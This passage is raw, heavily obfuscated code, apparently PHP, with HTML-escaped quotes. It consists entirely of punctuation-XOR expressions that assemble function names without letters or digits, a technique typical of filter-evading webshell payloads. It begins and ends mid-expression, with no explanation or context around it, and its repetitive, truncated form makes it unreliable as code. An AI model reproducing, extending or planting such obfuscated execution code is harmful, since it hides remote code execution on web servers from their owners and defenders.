;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)))):((\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;))(((\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;))(((\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;))((\u0026#39;(\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026